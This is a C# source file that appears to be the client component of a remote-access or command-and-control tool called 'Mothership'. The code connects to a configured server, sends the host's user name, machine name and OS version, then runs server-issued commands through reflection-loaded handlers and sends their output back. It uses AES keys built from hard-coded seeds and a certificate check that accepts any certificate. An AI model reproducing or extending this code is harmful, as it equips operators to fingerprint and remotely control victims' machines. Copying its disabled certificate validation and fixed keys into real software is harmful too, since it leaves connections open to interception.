using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

using LibMothership.Crypto;

namespace LibMothership.Networking
{
    public class MothershipConnection
    {
        public const int CRYPTO_KEY_SEED = 0xBADA55;
        public const int CRYPTO_IV_SEED = 0x0C0BABE;

        public string IP { get; private set; }
        public int Port { get; private set; }

        public Dictionary<string, ICommand> Commands { get; private set; }

        public event EventHandler<ServerConnectedEventArgs> ServerConnected;
        public event EventHandler<ServerDisconnectedEventArgs> ServerDisconnected;
        public event EventHandler<ServerMessageReceivedEventArgs> ServerMessageReceived;

        private TcpClient client;
        private StreamReader reader;
        private StreamWriter writer;

        private byte[] aesKey;
        private byte[] aesIV;

        public MothershipConnection(string ip, int port)
        {
            IP = ip;
            Port = port;

            Commands = new Dictionary<string, ICommand>();

            client = new TcpClient(ip, port);
            SslStream stream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateCert));
            stream.AuthenticateAsClient("mothershipClient");

            reader = new StreamReader(stream);
            writer = new StreamWriter(stream);
            writer.AutoFlush = true;

            aesKey = AES.Generate16ByteArrayFromSeed(CRYPTO_KEY_SEED);
            aesIV = AES.Generate16ByteArrayFromSeed(CRYPTO_IV_SEED);
        }   

        public void Close()
        {
            client.Close();
        }

        public void LoadCommandsFromAssembly(Assembly ass)
        {
            foreach (var type in ass.GetTypes())
            {
                if (type.GetInterface(typeof(ICommand).FullName) != null)
                {
                    var command = (ICommand)Activator.CreateInstance(type);
                    if (Commands.ContainsKey(command.Name))
                        Commands.Remove(command.Name);
                    Commands.Add(command.Name, command);
                }
            }
        }

        public void Send(string msg)
        {
            byte[] data = ASCIIEncoding.ASCII.GetBytes(msg);
            byte[] encrypted = AES.Encrypt(aesKey, aesIV, data);
            writer.WriteLine(Convert.ToBase64String(encrypted));
        }

        public void SendBanner()
        {
            StringBuilder banner = new StringBuilder();
            banner.AppendLine(Environment.UserName);
            banner.AppendLine(Environment.MachineName);
            banner.Append(Environment.OSVersion);
            banner.Append(Environment.Version);

            Send(banner.ToString());
        }

        public void Start()
        {
            OnServerConnected();
            SendBanner();
            LoadCommandsFromAssembly(Assembly.GetExecutingAssembly());

            new Thread(() => messageListenerThread()).Start();
        }

        private void messageListenerThread()
        {
            while (true)
            {
                byte[] encrypted = Convert.FromBase64String(reader.ReadLine());
                byte[] decrypted = AES.Decrypt(aesKey, aesIV, encrypted);
                OnServerMessageReceived(ASCIIEncoding.ASCII.GetString(decrypted));
            }
        }

        protected virtual void OnServerConnected()
        {
            var handler = ServerConnected;
            if (handler != null)
                handler(this, new ServerConnectedEventArgs(this));
        }

        protected virtual void OnServerDisconnected()
        {
            var handler = ServerDisconnected;
            if (handler != null)
                handler(this, new ServerDisconnectedEventArgs(this));
        }

        protected virtual void OnServerMessageReceived(string message)
        {
            string[] parts = message.Split(' ');
            string cmd = parts[0];
            string[] args = parts.Skip(1).ToArray();

            if (Commands.ContainsKey(cmd))
            {
                try
                {
                    StringBuilder output = new StringBuilder();
                    Commands[cmd].Invoke(this, output, args);
                    Send(output.ToString());
                }
                catch (Exception ex)
                {
                    try
                    {
                        Send(ex.ToString());
                    }
                    catch
                    {
                        OnServerDisconnected();
                    }
                }
            }
            else
            {
                var handler = ServerMessageReceived;
                if (handler != null)
                    handler(this, new ServerMessageReceivedEventArgs(message));
            }
        }

        public static bool ValidateCert(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }
    }
}
